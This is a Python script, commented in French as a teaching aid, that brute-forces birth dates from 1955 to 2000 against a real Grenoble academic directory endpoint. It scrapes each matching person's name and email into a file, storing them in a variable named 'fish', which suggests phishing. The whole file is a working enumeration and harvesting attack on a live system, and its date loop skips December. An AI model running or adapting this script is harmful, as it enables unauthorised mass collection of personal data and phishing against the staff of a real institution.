import requests
import urllib.parse
from termcolor import cprint
from bs4 import BeautifulSoup as bs
# donner un allias à un module importer pour simplifier l'écriture et la lecture du code (import foo as bar)

def _input(userMessage = "") -> bool:
    # l'annotation '-> type' permet de typer le retour d'un fonction (commme en C quand tu fais 'type maFonction(){}' )
    """
    Fonction qui récupère le choix d'un utilisateur sans la touche 'Entrée'
    Tant que le choix n'est pas conforme le process continue
    :type userMessage: str
    :param userMessage: (Optionel) Afficher un message avant la saisie utilisateur
    :rtype: bool
    :return Vrais si 'y' ou 'Y' et Faux si 'n' ou 'N'
    """

    # les commentaire avec trois double cote permette de faire des documentations reconnues par les IDE ,
    #   :type nomArgument: Type             permet de documenter le type l'argument
    #   :param nomArgument: Description     permet de commenter la nature de l'argument
    #   :rtype: Type                        permet de documenter le type de retour de la fonction
    #   :return Description                 permet de commenter la nature de la fonction
    #   Grace à ces annotaion, dans un IDE quand tu survole ou tape le nom d'une fonction
    #       une boite de dialogue apparait et restitue ces information

    # Si message à afficher, on affiche le message
    if len(userMessage):
        print(userMessage)

    # Si msvcrt est indisponible on redéfinnit la méthode getch
    try:
        from msvcrt import getch
    except ImportError:
        def getch():
            import sys, tty, termios
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            try:
                tty.setraw(sys.stdin.fileno())
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            return ch

    print("Press Y or N to continue")

    # Dés que la touche saisie est conforme, on retourne la valeur bool du choix (yes = true, no = false)
    while True:
        char = getch()
        if char.lower() in ("y", "n"):
            return {"y": True, "n": False}[char.lower()]
            break


def process(**kwargs):
    dateTuple = (kwargs['d'], kwargs['m'], kwargs['y'])
    params = {'daten1': kwargs['d'], 'daten2': kwargs['m'], 'daten3': kwargs['y']}
    params = urllib.parse.urlencode(params)
    requests.post('https://bv.ac-grenoble.fr/searchannu/src/infos_perso/etape2.php?login=%20')
    r = requests.get('https://bv.ac-grenoble.fr/searchannu/src/infos_perso/infos_perso.php?', params)
    soup = bs(r.text, 'html.parser')

    if len(soup.findAll('td')) * soup.findAll('a'):
        fish = {
            'name': soup.findAll('td')[1].get_text(),
            'mail': soup.findAll('a')[0].get_text(),
        }
        file = open("links.txt", "a")
        file.write(fish['name'] + " : " + fish['mail'] + '\n')
        file.close()
        resultText = '{} {} {} : Utilisateur trouvé.'.format(*dateTuple)
        outputColor = 'green'
    else:
        resultText = '{} {} {} : Aucun utilisateur avec cette date.'.format(*dateTuple)
        outputColor = 'red'
    cprint(resultText, outputColor, 'on_grey')


# Ceci est une fonction Lambda, on les utilise lorsque une fonction fait une seule action
withInput = lambda : {'d': int(input("Day: ")), 'm': int(input("Month: ")), 'y': int(input("Year: "))}


def automatic():
    #todo : Créer un algo pour que le nombre de jour dans un mois sois cohérent ( 29, 30 ou 31 jour ;) )
    daten3 = 1955
    while daten3 < 2001:
        daten2 = 1
        while daten2 < 12:
            daten1 = 1
            while daten1 < 32:
                process(**{'d': daten1, 'm': daten2, 'y': daten3})
                daten1 += 1
            daten2 += 1
        daten3 += 1


def getID():

    choice = _input("Mode pilote automatique ?")
    if choice:
        automatic()
    else:
        process(**withInput()) # Voir **Kwarg python
    

# Cette annotaion definit la fonction qui sera appeler
#   si et seulement si le fichier est executé par python ( 'python monFichier' )
if __name__ == '__main__':
    getID()
